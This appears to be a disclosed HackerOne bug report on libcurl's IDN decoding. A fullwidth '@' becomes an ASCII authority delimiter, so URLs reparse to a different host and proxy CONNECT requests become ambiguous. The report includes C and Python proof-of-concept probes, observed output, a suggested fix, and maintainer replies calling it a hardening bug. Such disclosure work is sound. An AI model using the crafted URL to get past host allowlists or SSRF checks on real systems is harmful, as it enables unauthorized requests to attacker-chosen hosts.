---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/server-side-request-forgery-ssrf
  - env/web
substate: "informative"
weakness: "Server-Side Request Forgery (SSRF)"
enriched: true
body: true
date: 2026-10-21
submitted: 2026-10-20T18:52:26.824Z
bounty_usd: null
votes: 12
cve: "CVE-2016-8625", "CVE-2022-42916"
program: "[[programs/curl|curl]]"
reporter: "zefanxu"
source: "https://hackerone.com/reports/4129950"
title: "IDN decoding inserts authority delimiters and can redirect proxy CONNECT to a different host"
---
# IDN decoding inserts authority delimiters and can redirect proxy CONNECT to a different host

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 12 | **Program:** curl | **Disclosed:** 2026-10-21

- Report: [https://hackerone.com/reports/4129950](https://hackerone.com/reports/4129950)
- CWE: Server-Side Request Forgery (SSRF) | CVE: CVE-2016-8625, CVE-2022-42916
- Submitted: 2026-10-20T18:52:26.824Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

IDN decoding can insert authority delimiters: CURLU_PUNYCODE output does not

round-trip and proxy requests carry an ambiguous authority

## Summary

libcurl's IDN decoder accepts a hostname containing U+FF20 FULLWIDTH COMMERCIAL

AT (`＠`). libidn2's TR46 transitional fallback converts it to ASCII `@`.

`Curl_idn_decode()` only checks that the result is non-empty, so the decoded

host can contain characters that the URL parser itself treats as authority

delimiters.

Consequences:

1. `curl_url_get(..., CURLU_PUNYCODE)` returns a URL that reparses to a
    
    different host and userinfo.
    
2. Through an HTTP proxy, curl sends the decoded host in the request target.
    
    A proxy using generic URL/authority parsing sees a different host than the
    
    URL's apparent host.
    
3. The non-tunneling proxy path fails with `CURLE_OUT_OF_MEMORY` because the
    
    decoded host cannot be stored with `CURLUPART_HOST`.
    

This is an internal round-trip inconsistency in libcurl, not merely a

browser-versus-curl disagreement.

## Tested versions

- curl 8.23.0, built with libidn2 2.2.0
- curl master `eb2b201a2` (`8.23.1-DEV`), built with libidn2 2.2.0
- System curl 7.68.0 with libidn2 2.2.0 also emitted the proxy request with
    
    the decoded ASCII `@`
    

## Root cause

- `lib/idn.c:314` `Curl_idn_decode()` only rejects an empty result at
    
    `lib/idn.c:329`.
    
- `lib/peer.c:215` stores the decoded host directly.
- `lib/urlapi.c:1638` concatenates the decoded host into the serialized URL.
- `lib/http_proxy.c:213` builds the CONNECT authority from the decoded host.

The URL parser already has an `invalid_host_char` table at

`lib/urlapi.c:446` that rejects `@`, `/`, `:`, `?`, `#`, `[`, `]`, and other

delimiters. The decoder does not apply that validation to its output.

## Reproduction

The probes are in this directory:

- `idn_url_probe.c`
- `idn_proxy_poc.py`

### URL API round trip

Build `audit/idn_url_probe.c` against libcurl with libidn2 and run it.

The process must call `setlocale(LC_ALL, "")` so libidn2's locale-dependent

`idn2_lookup_ul()` sees UTF-8.

Observed on 8.23.0 and master:

```
set-url: 0 (No error)
host: 0 [trusted.example＠evil.example]
punycode-host: 0 [trusted.example@evil.example]
punycode-host-as-host: 21 (Bad hostname)
punycode-url: 0 [https://trusted.example@evil.example/x]
reparse: 0 (No error)
reparsed-host: [evil.example]
reparsed-user: [trusted.example]
```

### Proxy wire behavior

Run `audit/idn_proxy_poc.py` with an IDN-enabled curl binary.

Observed on 8.23.0 and master:

```
tunnel=True
request-line: CONNECT trusted.example@evil.example:80 HTTP/1.1
Host: trusted.example@evil.example:80
parsed-host: evil.example
parsed-user: trusted.example
```

Python's `urllib.parse.urlsplit()` interprets the absolute-form target as

host `evil.example` with username `trusted.example`, which is the standard

generic-authority interpretation.

Observed on curl 7.68.0, the non-tunneling request is:

```
GET http://trusted.example@evil.example/x HTTP/1.1
Host: trusted.example@evil.example
```

On 8.23.0 and master, the same non-tunneling request currently fails with

`CURLE_OUT_OF_MEMORY` before reaching the proxy.

## Suggested fix

After IDN decoding, validate the result with the same hostname syntax rules

used by the URL parser, at minimum rejecting ASCII `@`, `/`, `:`, `?`, `#`,

`[`, `]`, and `\`. Reject the conversion with `CURLE_URL_MALFORMAT` rather

than returning an invalid host.

Add regression tests that:

- assert `curl_url_get(CURLUPART_URL, CURLU_PUNYCODE)` reparses to the same
    
    scheme, host, port, and userinfo;
    
- cover U+FF20, U+FF0F, U+FF1A, U+FF1B, U+FF1F, U+FF03, U+FF3B, U+FF3D,
    
    and U+FF3C;
    
- exercise both proxy CONNECT and non-tunneling absolute-form requests.

## C PoC

File: `idn_url_probe.c`

```c
#include <curl/curl.h>
#include <locale.h>
#include <stdio.h>

static void free_part(char **p)
{
  if(*p) {
    curl_free(*p);
    *p = NULL;
  }
}

int main(void)
{
  /* U+FF20 FULLWIDTH COMMERCIAL AT, encoded as UTF-8. */
  const char *input = "https://trusted.example\xef\xbc\xa0"
                      "evil.example/x";
  CURLU *u = NULL;
  CURLU *v = NULL;
  CURLU *w = NULL;
  char *host = NULL;
  char *phost = NULL;
  char *purl = NULL;
  char *rhost = NULL;
  char *ruser = NULL;
  CURLUcode rc;

  setlocale(LC_ALL, "");
  curl_global_init(CURL_GLOBAL_DEFAULT);
  u = curl_url();
  v = curl_url();
  w = curl_url();
  if(!u || !v || !w)
    return 2;

  rc = curl_url_set(u, CURLUPART_URL, input, 0);
  printf("set-url: %d (%s)\n", (int)rc, curl_url_strerror(rc));
  if(rc)
    goto out;

  rc = curl_url_get(u, CURLUPART_HOST, &host, 0);
  printf("host: %d [%s]\n", (int)rc, host ? host : "(null)");
  rc = curl_url_get(u, CURLUPART_HOST, &phost, CURLU_PUNYCODE);
  printf("punycode-host: %d [%s]\n", (int)rc, phost ? phost : "(null)");
  if(phost) {
    rc = curl_url_set(w, CURLUPART_HOST, phost, 0);
    printf("punycode-host-as-host: %d (%s)\n",
           (int)rc, curl_url_strerror(rc));
  }
  rc = curl_url_get(u, CURLUPART_URL, &purl, CURLU_PUNYCODE);
  printf("punycode-url: %d [%s]\n", (int)rc, purl ? purl : "(null)");

  if(purl) {
    rc = curl_url_set(v, CURLUPART_URL, purl, 0);
    printf("reparse: %d (%s)\n", (int)rc, curl_url_strerror(rc));
    if(!rc) {
      curl_url_get(v, CURLUPART_HOST, &rhost, 0);
      curl_url_get(v, CURLUPART_USER, &ruser, 0);
      printf("reparsed-host: [%s]\n", rhost ? rhost : "(null)");
      printf("reparsed-user: [%s]\n", ruser ? ruser : "(null)");
    }
  }

out:
  free_part(&host);
  free_part(&phost);
  free_part(&purl);
  free_part(&rhost);
  free_part(&ruser);
  curl_url_cleanup(v);
  curl_url_cleanup(w);
  curl_url_cleanup(u);
  curl_global_cleanup();
  return 0;
}
```

## Python PoC

File: `idn_proxy_poc.py`

```python
#!/usr/bin/env python3
import socket
import subprocess
import sys
import threading
import time
from urllib.parse import urlsplit

def run_one(curl, tunnel):
    result = {}

    def proxy():
        listener = socket.socket()
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)
        listener.settimeout(5)
        result["port"] = listener.getsockname()[1]
        try:
            conn, _ = listener.accept()
            conn.settimeout(3)
            data = b""
            while b"\r\n\r\n" not in data:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
            result["request"] = data
            conn.close()
        except Exception as exc:
            result["error"] = repr(exc)
        listener.close()

    thread = threading.Thread(target=proxy)
    thread.daemon = True
    thread.start()
    while "port" not in result and "error" not in result:
        time.sleep(0.01)

    url = "http://trusted.example\uff20evil.example/x"
    cmd = [curl, "-sS", "-m", "2", "-x",
           "http://127.0.0.1:%d" % result["port"]]
    if tunnel:
        cmd.append("--proxytunnel")
    cmd.append(url)
    proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    thread.join(timeout=2)

    request = result.get("request", b"")
    first = request.split(b"\r\n")[0].decode("utf-8", "replace")
    print("tunnel=%s rc=%d" % (tunnel, proc.returncode))
    print("request-line: %s" % first)
    if tunnel and first.startswith("CONNECT "):
        parsed = urlsplit("//" + first.split(" ", 2)[1])
    elif not tunnel and first.startswith("GET "):
        parsed = urlsplit(first.split(" ", 2)[1])
    else:
        parsed = None
    if parsed:
        print("parsed-host: %s" % parsed.hostname)
        print("parsed-user: %s" % parsed.username)
    print()

def main():
    curl = sys.argv[1] if len(sys.argv) > 1 else "./build-asan/src/curl"
    print("curl=%s\n" % curl)
    run_one(curl, True)
    run_one(curl, False)

if __name__ == "__main__":
    main()
```

## Reproduction commands

Build the C probe against an IDN-enabled libcurl build, then run:

```bash
./audit/idn_url_probe_master
ASAN_OPTIONS=detect_leaks=0 python3 audit/idn_proxy_poc.py ./curl-master-as/src/curl
```

Observed URL API result:

```
host: trusted.example＠evil.example
punycode-host: trusted.example@evil.example
punycode-host-as-host: 21 (Bad hostname)
punycode-url: https://trusted.example@evil.example/x
reparsed-host: evil.example
reparsed-user: trusted.example
```

Observed proxy request:

```
CONNECT trusted.example@127.0.0.1:8080 HTTP/1.1
Host: trusted.example@127.0.0.1:8080
```

tinyproxy 1.10 `extract_url()` calls `strip_username_password()`, which removes everything through the first `@`, so tinyproxy connects to `127.0.0.1:8080`.

## Impact

## Impact

- A host allowlist, redirect filter, URL cache, or SSRF check using
    
    `CURLU_PUNYCODE` as the canonical form can be bypassed because the output
    
    reparses to a different origin.
    
- In proxy environments, a proxy that accepts userinfo in an absolute-form
    
    request or CONNECT authority can be induced to connect to the attacker's
    
    host while the user-visible URL appears to start with `trusted.example`.
    
- The non-tunneling path returns `CURLE_OUT_OF_MEMORY`, which is a
    
    request-level availability failure.
    

The impact requires an application that accepts the URL and a proxy that

parses the resulting authority permissively. That dependency is why this

should be rated Medium rather than High.

The application cannot reasonably reject the dangerous input by inspecting

the raw hostname: `curl_url_set()` accepts it, and the ASCII `@` only appears

after libcurl's own IDN conversion. The breakage is in libcurl's normalized

output, not in a separate browser parser.

## Why this is not a duplicate of older IDN advisories

- CVE-2016-8625 covered IDNA 2003 versus IDNA 2008 selecting a different
    
    valid hostname.
    
- CVE-2022-42916 covered an HSTS bypass using IDN characters that map to an
    
    ASCII dot.
    
- This report covers the decoder producing authority delimiters that make
    
    libcurl's own `CURLU_PUNYCODE` output non-round-trippable and make proxy
    
    requests ambiguous. The older HSTS-specific check does not cover this path.
    

The precedent for accepting this class is CVE-2022-42916, which was rated

Medium for an IDN character mapping to an ASCII authority separator. This

report has the same class of normalization mismatch plus a direct proxy

request impact.

## Timeline

- **Draft Started**
- **Report Filed**
- **2026-10-20** @cmeister2: Please read the [project guidelines](https://hackerone.com/curl) again, specifically

>Keep the entire initial submission brief. Across the whole Vulnerability Information field, use no more than six prose sentences total—not six sentences per section. You may additionally include one minimal, self-contained proof-of-concept script of no more than 30 non-empty lines and up to 10 lines of essential output. Do not add root-cause analysis, suggested fixes, background, CVE comparisons, duplicate-search notes, large logs, tables, attachments, or multi-file test harnesses unless the curl team requests them in a follow-up. Headings, bullets, and sentence fragments must not be used to evade the limit. Before submitting, count the sentences and remove anything that is not necessary to understand and reproduce the issue.
- **2026-10-20** @bagder: Are there actually commonly used proxy implementations that accept that invalid CONNECT request? The  at sign is not a valid character to use in the hostname there.
- **2026-10-21** @jimfuller2024: I believe tinyproxy does tihs - but if attacker already controls url then whats the point  ... I would like to see this treated as a hardening bug and move this over to github issue.
- **2026-10-21** @bagder: Agreed. A bug, not a vulnerability
- **Report Informative**
- **Agreed On Going Public**
- **2026-10-21** @bagder: PR:  https://github.com/curl/curl/pull/23545
- **Manually Disclosed**
